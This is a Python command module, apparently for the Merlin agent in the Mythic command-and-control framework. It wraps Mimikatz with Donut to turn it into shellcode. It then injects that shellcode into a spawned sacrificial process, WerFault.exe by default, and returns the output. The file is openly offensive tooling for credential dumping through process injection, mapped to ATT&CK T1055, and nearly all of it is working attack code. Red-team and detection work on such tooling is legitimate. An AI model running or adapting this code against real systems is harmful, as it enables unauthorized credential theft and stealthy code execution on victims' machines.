
from merlin import MerlinJob, donut
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json
import shlex

# Set to enable debug output to Mythic
debug = False


class MimikatzArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "commandline": CommandParameter(
                name="commandline",
                type=ParameterType.String,
                description="Mimikatz commandline arguments",
                default_value="token::whoami coffee",
                ui_position=0,
                required=True,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute Mimikatz in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=1,
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="argument to create the spawnto process with, if any",
                ui_position=2,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                # This allows an operator to specify the name of an a file that was previously registered with Mythic
                # in place of providing the actual file
                args = shlex.split(self.command_line)
                if len(args) > 0:
                    self.add_arg("commandline", args[0], ParameterType.String)
                if len(args) > 1:
                    self.add_arg("spawnto", args[1], ParameterType.String)
                if len(args) > 2:
                    self.add_arg("spawntoargs", args[2], ParameterType.String)


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz"
    description = "Converts mimikatz.exe into shellcode with Donut, executes it in the spawnto process, and returns output"
    version = 1
    author = "@Ne0nd0g"
    argument_class = MimikatzArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f'{task.args.get_arg("commandline")}\n' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'
        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Starting create_tasking()')

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Calling donut()')
        # Donut Arguments
        donut_args = {
            # Mimikatz already exists at this location in the Merlin Docker container
            "in": "/opt/mimikatz/x64/mimikatz.exe",
            # Must append the "exit" command for Mimikatz to return
            "params": f'{task.args.get_arg("commandline")} exit',
            "exit": "2",
            "verbose": True,
            "thread": True,
        }

        donut_shellcode, donut_result = donut(b'', donut_args)
        task.stdout += f'\n{donut_result}'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [donut_shellcode, task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("commandline")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass
